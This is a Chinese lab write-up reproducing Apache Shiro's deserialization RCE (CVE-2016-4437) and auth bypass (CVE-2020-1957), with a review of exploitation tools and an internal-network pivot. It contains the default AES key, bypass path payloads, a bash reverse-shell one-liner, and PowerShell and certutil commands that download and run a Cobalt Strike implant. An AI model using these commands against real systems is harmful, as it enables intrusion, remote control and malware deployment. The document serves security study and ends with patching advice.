>
> 本篇文章是Shiro框架复现记录，记录了实际中常见的Shiro框架漏洞并如何利用，对漏洞底层的原理简单分析，主要分为五个部分：Shiro简单介绍、相关环境搭建、漏洞复现、工具介绍和自建内网环境实战。
>
>
> 本篇文章由浅入深地复现了两个经典漏洞及介绍五个Shiro渗透工具，相关参考文章也在文中有列出。此外，文中也可能会出现部分错误，望读者指出，谢谢。接着，开始我们的Shiro渗透之路学习！

## 一、Shiro简介

### 1、Shiro介绍

`Apache Shiro`是一个强大且易用的`Java`安全框架，用于身份验证、授权、密码和会话管理，具有以下特点：

 **易于使用**
——易用性是项目的最终目标。应用程序安全非常令人困惑和沮丧,被认为是“不可避免的灾难”。如果你让它简化到新手都可以使用它,它就将不再是一种痛苦了。

 **全面** ——没有其他安全框架的宽度范围可以同Apache Shiro一样,它可以成为你的“一站式”为您的安全需求提供保障。

 **灵活** ——Apache
Shiro可以在任何应用程序环境中工作。虽然在网络工作、EJB和IoC环境中可能并不需要它。但Shiro的授权也没有任何规范,甚至没有许多依赖关系。

 **Web支持** ——Apache
Shiro拥有令人兴奋的web应用程序支持,允许您基于应用程序的url创建灵活的安全策略和网络协议(例如REST),同时还提供一组JSP库控制页面输出。

 **低耦合** ——Shiro干净的API和设计模式使它容易与许多其他框架和应用程序集成。你会看到Shiro无缝地集成Spring这样的框架,
以及Grails, Wicket, Tapestry, Mule, Apache Camel, Vaadin…等。

 **被广泛支持** ——Apache
Shiro是Apache软件基金会的一部分。项目开发和用户组都有友好的网民愿意帮助。这样的商业公司如果需要Katasoft还提供专业的支持和服务。

### 2、Shiro漏洞原理

在`Shiro`框架下，用户登陆成功后会生成一个经过加密的`Cookie`。其`Cookie`的`Key`的值为`RememberMe`，`Value`的值是经过序列化、`AES`加密和`Base64`编码后得到的结果。

服务端在接收到一个Cookie时，会按照如下步骤进行解析处理：

检索`RememberMe Cookie`的值

进行`Base64`解码

进行`AES`解码

进行反序列化操作

在第4步中的调用反序列化时未进行任何过滤，进而可以导致出发远程代码执行漏洞。

由于使用了`AES`加密，成功利用该漏洞需要获取`AES`的加密密钥，在`Shiro1.2.4`版本之前`AES`的加密密钥为硬编码，其默认密钥的`Base64`编码后的值为`kPH+bIxk5D2deZiIxcaaaA==`，于是就可得到`Payload`的构造流程：

    
    
    恶意命令-->序列化-->AES加密-->base64编码-->发送Cookie

目前官方通过去掉硬编码的密钥是的每次生成一个密钥来解决其漏洞，但可以通过搜索引擎等方式收集到不同的密钥，提高对该漏洞的利用成功率。

### 3、Shiro漏洞指纹

    
    
    响应包中存在字段set-Cookie: rememberMe=deleteMe

## 二、环境搭建

### 1、Java1.8安装

下载地址：`https://www.java.com/zh-CN/download/`

默认下一步安装即可

### 2、Tomcat8.x安装

下载地址：`https://tomcat.apache.org/download-80.cgi`

默认下一步安装即可

### 3、部署Shiro war包

将`whiro.war`包放置`C:\Tomcat 8.5\webapps\`目录下

开启`Tomcat`

![gxq8sI.png](https://image.3001.net/images/20210525/1621910832_60ac6530b10b15d7270e7.png!small)

访问网址：`192.168.112.151:8080`，该`ip`是环境自身`ip`地址

![gxq3QA.png](https://image.3001.net/images/20210525/1621910835_60ac6533e03c96e7adcc8.png!small)

### 4、漏洞环境搭建

这里使用`vulhub`靶场进行Spring渗透学习

####  **0x01 Docker环境安装**

参考：[vulhub漏洞环境搭建](https://blog.csdn.net/qq_36374896/article/details/84102101)

 **1、安装Docker**

    
    
    sudo apt install curl  
    curl -s https://get.docker.com/ | sh

![gPa2sU.png](https://image.3001.net/images/20210525/1621911183_60ac668fd94aa5fbe94ae.png!small)

![gPagMT.png](https://image.3001.net/images/20210525/1621911187_60ac66938cc25e416fc61.png!small)

 **2、安装python和pip**

    
    
    sudo apt install python  
    curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py  
    sudo python get-pip.py

![gPa6zV.png](https://image.3001.net/images/20210525/1621911192_60ac6698d1970e5cc4b44.png!small)

![gPasGq.png](https://image.3001.net/images/20210525/1621911196_60ac669c9a2e6fb61d747.png!small)

 **3、安装`docker-compose﻿`**

    
    
    pip install docker-compose  
    sudo apt install docker-compose  
    docker-compose -v

![gPayR0.png](https://image.3001.net/images/20210525/1621911201_60ac66a191fb4f98556ac.png!small)

![gPaBIs.png](https://image.3001.net/images/20210525/1621911208_60ac66a801e567e34dbea.png!small)

####  **0x02 vulhub靶场安装**

    
    
    git clone https://github.com/vulhub/vulhub.git  
    cd vulhub/httpd/CVE-2017-15715/  
    sudo docker-compose build       # 构建  
    sudo docker-compose up -d       # 命令启动容器  
    docker ps                       # 查看正在运行的容器  
    sudo docker exec -it b5975a1a5bfe /bin/bash  # 进入docker容器内

![gPa0aj.png](https://image.3001.net/images/20210525/1621911213_60ac66ad0824e164dcfc7.png!small)

![gPawZQ.png](https://image.3001.net/images/20210525/1621911216_60ac66b0a69b19f53aeea.png!small)

> 本机IP为192.168.112.141
>
> 参考： [Docker容器进入的4种方式](https://www.cnblogs.com/xhyan/p/6593075.html)

###

## 三、漏洞复现

> 以复现操作为主，底层原理解析见之后的文章

### 1、Apache Shiro反序列化漏洞（CVE-2016-4437）

> AES密钥猜解RCE

####  **0x01 漏洞概述**

在`Shiro`框架下，用户登陆成功后会生成一个经过加密的`Cookie`。其`Cookie`的`Key`的值为`RememberMe`，`Value`的值是经过序列化、`AES`加密和`Base64`编码后得到的结果。`AES`的加密密钥为硬编码，导致攻击者可以构造恶意数据造成反序列化`RCE`漏洞

 **影响版本：**

    
    
    Shiro < 1.2.5

####  **0x02 漏洞指纹**

响应包中存在字段`set-Cookie: rememberMe=deleteMe`

####  **0x03 漏洞利用**

1）使用工具进行`AES`密钥猜解

![gxqlzd.png](https://image.3001.net/images/20210525/1621910842_60ac653a01384bc9e5c37.png!small)

2）使用工具命令执行

![gxqQRH.png](https://image.3001.net/images/20210525/1621910845_60ac653db27ac63a0618d.png!small)

#### 0x04 自动化工具及上线CS

这里介绍一款反序列化远程命令执行利用脚本`shiro-1.2.4-rce`，[传送门](https://github.com/zhzyker/shiro-1.2.4-rce)

 **利用条件：**`shiro <= 1.2.4`

使用延时判断`key`和`gadget`，即使 **目标不出网** 也可以检测是否存在漏洞。`Python`脚本需要调用`ysoserial-sleep.jar`，这里的`ysoserial-sleep.jar`文件并不是原版的，增加了延时命令功能，故不要使用原版`ysoserial`，否则将无法检测。该工具具有4个特性：

  1. Key可修改添加

  2. 具有延时功能

  3. 执行的命令使用了`Base64`编码

  4. 区分`Linux`和`Windows`

 **使用方法：**

![gxqKiD.png](https://image.3001.net/images/20210525/1621910850_60ac654255037f3aae2ba.png!small)

输入`python3 shiro-1.2.4_rce.py
http://192.168.112.151:8080/shiro/`这里的`IP`是刚刚在`Win7`上搭建的环境的`IP`

执行`calc`，远程打开目标主机上的计算器程序

![gxqMJe.png](https://image.3001.net/images/20210525/1621910857_60ac65495ac4f789e953f.png!small)

> 注意点：这里命令是自动编制执行的，仍可执行，但是 **无回显** 。

 **上线CS：**

由于上述自动化工具没有回显，这里尝试上线到CS后进一步渗透

1）开启`teamserver`

    
    
    teamserver 192.168.112.145 1111

![gxqmdK.png](https://image.3001.net/images/20210525/1621910867_60ac6553260c73b97b9bc.png!small)

2）生成木马文件

开启python简易http服务，但是我这win7没安装python，就将该木马文件放到kali上，在开启简易http用于传输

![gxqeZ6.png](https://image.3001.net/images/20210525/1621910875_60ac655be4c48524597af.png!small)

3）Kali上开启python简易HTTP服务

    
    
    python -m SimpleHTTPServer 8008

![gxqVqx.png](https://image.3001.net/images/20210525/1621910878_60ac655e265c83d38ffbf.png!small)

4）结合之前得到的shell上线CS

    
    
    powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.112.149:8008/Shiro1.exe','Shiro1.exe');start-process Shiro1.exe

![gxqnIO.png](https://image.3001.net/images/20210525/1621910881_60ac6561a15b82afd0bba.png!small)

### 2、 Apache Shiro权限绕过漏洞（CVE-2020-1957）

> 越权访问

参考：[Shiro 权限绕过漏洞分析（CVE-2020-1957） - 斗象能力中心
(riskivy.com)](https://blog.riskivy.com/shiro-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88cve-2020-1957%EF%BC%89/)

####  **0x01 漏洞概述**

`Shiro`框架使用拦截器对用户访问权限进行控制，常见的有如`anon、authc`等拦截器。

`anon`拦截器为匿名拦截器，无需登陆即可进行访问，一般用于静态资源。`authc`为登陆拦截器，需要登陆才可以访问。

用户可以在`Shiro.ini`编写匹配URL配置，将会拦截匹配的URL，并执行响应的拦截器。从而实现对URL的访问控制，URL路径表达式通常为ANT格式。即访问`/index`时无需登陆，而访问`/user/test`时需要登陆认证。

    
    
    #Shiro.ini  
    /index = anon  
    /user/** = authc  
    ------  
    Ant格式:  
    ?：匹配一个字符  
    *：匹配零个或多个字符串  
    **：匹配路径中的零个或多个路径

这里的`/**`可以匹配路径，即可以匹配到`/user/test/`，而`/*`只能匹配到单个或多个字符串，即`/user/test`。那么假设配置内改为：`/user/*
=
authc`，则可以匹配到`/user/test`但无法匹配到`/user/test/`（多了个斜杆），那么就会放行`/user/test/`。然后进入到`Spring(Servlet)`拦截器中，对于Spring，上述两个路径都是一致的，于是就造成了权限绕过。

 **影响版本：**

    
    
    Shiro < 1.5.3

####  **0x02 漏洞环境**

这里简单搭建环境测试下

1）拉取镜像

    
    
    docker pull vulfocus/shiro-cve_2020_1957

![gxqOYD.png](https://image.3001.net/images/20210525/1621910889_60ac6569e5f49033ea0ea.png!small)

2）查看并开启docker

    
    
    docker images  
    ​  
    docker run -d -p 8080:8080 -v /var/run/docker.sock:/var/run/docker.sock -e VUL_IP=192.168.112.141 29136b1d3c61  
    ​  
    docker ps

![gxqLFO.png](https://image.3001.net/images/20210525/1621910893_60ac656de6529c207f4b7.png!small)

3）访问靶机，开启成功

![gxqoO1.png](https://image.3001.net/images/20210525/1621910898_60ac6572c2da64476dad4.png!small)

####  **0x03 漏洞利用**

1）访问`/hello/1`，返回`302`重定向信息

    
    
    /hello/1

![gxqbTK.png](https://image.3001.net/images/20210525/1621910901_60ac65757374d853865bc.png!small)

2）访问`/hello/1/`，成功绕过`authc`拦截器

    
    
    /hello/1/

![gxqHw6.png](https://image.3001.net/images/20210525/1621910905_60ac65796208a9c376447.png!small)

除此之外，还可以使用下面的`payload`

    
    
    /abcd;/../hello/1

![gxq7ex.png](https://image.3001.net/images/20210525/1621910909_60ac657deff39fa9e078a.png!small)

#### 0x04 类似漏洞

类似的漏洞还有`CVE-2020-11989、CVE-2020-13933`。

## 四、Shiro渗透工具介绍

测试靶机地址信息：

    
    
    Win7搭建：  
    192.168.112.151  
    http://192.168.112.151:8080/shiro/  
    Linux Vulhub靶机：  
    192.168.112.141  
    http://192.168.112.141:8080

### 1、shiro反序列化漏洞综合利用工具v1.5

> 猜解Key和命令执行，对Linux较友好

 **工具截图：**

![gxLM7V.png](https://image.3001.net/images/20210525/1621910913_60ac6581371a0c6f86fe9.png!small)

 **工具使用：**

该工具主要给用于测试，上手简单，将目标地址填入对应栏即可

经测试Windows环境下有点小问题，能猜解Key但是无法命令注入

![gxLmXn.png](https://image.3001.net/images/20210525/1621910916_60ac65845a6ea4edfc7a6.png!small)

在Linux下使用体验较好

![gxLumq.png](https://image.3001.net/images/20210525/1621910919_60ac65877ffaced92eed4.png!small)

### 2、Shiro反序列化回显工具v2.3

> 猜解Key，效果一般

 **工具截图：** 该工具可自行添加Key

![gxLK00.png](https://image.3001.net/images/20210525/1621910922_60ac658a9b64fe86d4019.png!small)

 **工具使用：**

上手也是挺简单的，将key文件导入至Key框中，选择默认DNSLOG即可，开始检测。

不过体验时经常会找不到key

### 3、Shiro命令执行工具-雷石安全实验室

> 猜解Key，内置117个Key

 **工具截图：**

![gxLZlj.png](https://image.3001.net/images/20210525/1621910930_60ac6592041fc78a2a875.png!small)

 **工具使用：**

填入`url`，点击DNSLOG检测

![gxLe6s.png](https://image.3001.net/images/20210525/1621910932_60ac6594c2032cb1cb224.png!small)

### 4、Shiro550/721漏洞检测v2.51

> 用于外网的Key猜解及getshell，对Linux较友好

 **工具地址：**<https://github.com/feihong-cs/ShiroExploit-Deprecated>

 **工具截图：**

![gxL4N8.png](https://image.3001.net/images/20210525/1621910937_60ac6599625603ceda559.png!small)

 **工具使用：**

添加目标地址`http://192.168.112.151:8080/shiro/`，点击下一步，选择`dnslog.cn`进行漏洞检测，点击下一步进行猜解。

![gxLcjA.png](https://image.3001.net/images/20210525/1621910940_60ac659c03d87a42330f8.png!small)

获取到Key值后，该工具提供了三种方式进行下一步的渗透，具体如下：

    
    
    反弹Shell(Linux):采用 bash -i >& /dev/tcp/1.2.3.4/443 0>&1 命令获取shell  
    反弹Shell(Windows):采用 bitsadmin下载指定URL的exe可执行文件执行功能获取shell  
    获取Webshell 在给出的路径中写入webshell，webshell的内容在config目录下的shell.jsp中

这里选择反弹`Shell(Linux)`，下面结合`Kali`获取到`shell`，`kali`端开启监听，在命令行中写入`kali`的地址及端口号。

![gxLRBt.png](https://image.3001.net/images/20210525/1621910943_60ac659f9fc583c7c4b66.png!small)

![gxL2nI.png](https://image.3001.net/images/20210525/1621910948_60ac65a47c6c2996882cd.png!small)

选择反弹`Shell(Windows)`进行尝试，这里先启动了`CS、python简易服务器`，按照命令格式，输入下载`exe`文件的`url`，但是并未成功。看到下面有一行代码，测试直接在装有`shiro`主机处是否有效。

![gxLWHP.png](https://image.3001.net/images/20210525/1621910951_60ac65a7bbc542203d9ef.png!small)

    
    
    certutil.exe -urlcache -split -f http://192.168.112.149:8010/Shiro1.exe shell.exe & shell.exe

结果上线CS成功，说明该工具在命令执行这方面还是有点小bug

![gxLhAf.png](https://image.3001.net/images/20210525/1621910956_60ac65ac90dd5259060de.png!small)

测试`获取Webshell`选项，同样是有点小问题。

### 5、shiro-1.2.4-rce

> 可用于内网猜解Key，对Linux和Windows都支持较好

这里介绍一款反序列化远程命令执行利用脚本`shiro-1.2.4-rce`

 **工具地址：**<https://github.com/zhzyker/shiro-1.2.4-rce>)

 **工具截图：**

![gxqKiD.png](https://image.3001.net/images/20210525/1621910850_60ac654255037f3aae2ba.png!small)

 **利用条件：**`shiro <= 1.2.4`

使用延时判断`key`和`gadget`，即使 **目标不出网** 也可以检测是否存在漏洞。`Python`脚本需要调用`ysoserial-sleep.jar`，这里的`ysoserial-sleep.jar`文件并不是原版的，增加了延时命令功能，故不要使用原版`ysoserial`，否则将无法检测。该工具具有 **4个特性** ：

Key可修改添加

具有延时功能

执行的命令使用了`Base64`编码

区分`Linux`和`Windows﻿`

 **工具使用：**

    
    
    python3 shiro-1.2.4_rce.py http://192.168.112.151:8080/shiro/

这里的`IP`是刚刚在`Win7`上搭建的环境的`IP`

选择操作系统，这里选择`Windows`。如果未知操作系统类型，可以随便选一个，错了再跑一遍即可。

执行`calc`，远程打开目标主机上的`计算器程序`。

![gxqMJe.png](https://image.3001.net/images/20210525/1621910857_60ac65495ac4f789e953f.png!small)

> 注意点：这里命令是自动编制执行的，仍可执行，但是 **无回显** 。

## 五、内网Shiro渗透|上线CS

### 1、环境配置信息

    
    
    内网主机  
    搭建了shiro框架  
    10.10.10.100  
    ​  
    内网对外服务器  
    充当一个跳板  
    10.10.10.11  
    192.168.112.157  
    ​  
    公网服务器  
    用于和内网连接  
    192.168.112.145  
    ​  
    Kali Linux  
    192.168.112.149

### 2、实验模拟过程

 **1）获取内网服务器并上线CS**

> 重点在于后面内网主机的获取，这里直接假设获取了服务器的权限并上线了CS

![gxOGUf.png](https://image.3001.net/images/20210525/1621910973_60ac65bd960954fe99d34.png!small)

 **2）建立frp代理**

    
    
    frps.exe -c frps.ini  
    frpc.exe -c frpc.ini

> 这里设置有点小问题，`frps.ini`中的`bind_addr`应该设置为`0.0.0.0`接收全部地址的请求。但是这里也能进行下去，我思考下

![gxO8VP.png](https://image.3001.net/images/20210525/1621910977_60ac65c13ae4d5e3e0847.png!small)

在公网服务器上开启Proxifier代理隧道

![gxOQKA.png](https://image.3001.net/images/20210525/1621910980_60ac65c4a78673d8ac88f.png!small)

 **3）Kali通过代理使用脚本进行Attack**

配置`proxychains.conf`

    
    
    vi /etc/proxychains4.conf

![gxO1bt.png](https://image.3001.net/images/20210525/1621910983_60ac65c7e79023f16f460.png!small)

执行攻击脚本

    
    
    proxychains python3 shiro-1.2.4_rce.py http://10.10.10.100:8080/shiro/

![gxOlDI.png](https://image.3001.net/images/20210525/1621910988_60ac65cca8883a7d3526b.png!small)

成功猜解到加密密钥，得到一个shell框

![gxOKvd.png](https://image.3001.net/images/20210525/1621910992_60ac65d06802c0a69d93b.png!small)

下一步就是上线CS了

 **4）创建中转监听器**

![gxOZ4O.png](https://image.3001.net/images/20210525/1621910997_60ac65d572ab1f798cf8c.png!small)

选择监听器和监听主机（这里的监听主机`Host`需要改为内网的地址）

![gxOn8e.png](https://image.3001.net/images/20210525/1621911000_60ac65d88e2719c414d62.png!small)

 **5）生成木马**

![gxOmCD.png](https://image.3001.net/images/20210525/1621911006_60ac65de86075746ae12d.png!small)

选择中转监听器

![gxXMJU.png](https://image.3001.net/images/20210525/1621911008_60ac65e0b28a111c6e038.png!small)

 **6）内网主机上线CS**

将该木马文件放到内网服务器目录上（由于这里没有服务器目录，使用开启python简易服务器进行模拟，传输木马文件）

    
    
    python -m http.server 80

![gxOVUK.png](https://image.3001.net/images/20210525/1621911013_60ac65e5af3046f811265.png!small)

输入命令，上线CS

    
    
    powershell (new-object System.Net.WebClient).DownloadFile('http://10.10.10.11/shiro001.exe','shiro.exe');start-process shiro.exe

![gxOugH.png](https://image.3001.net/images/20210525/1621911016_60ac65e8075b3ccddddae.png!small)

遗憾的是这里还是有点小bug，没能复现成功，但基本思路就是这样

## 六、总结

`Shiro`框架使用了`AES`对称加密技术，故其加密密钥与解密密钥一致，并且密钥是硬编码在代码中的，容易获取。也就是说在获取了密钥之后可以通过构建恶意的`Cookie`获取权限执行攻击命令，得到`root`权限。解决措施就是升级`Shiro`版本至`shiro1.2.5`以上。而对于最近出现的`shiro`权限绕过漏洞，应需尽量避免使用`*`通配符作为动态路由拦截器的URL路径表达式或者升级`shiro`至`1.5.2`版本以上。

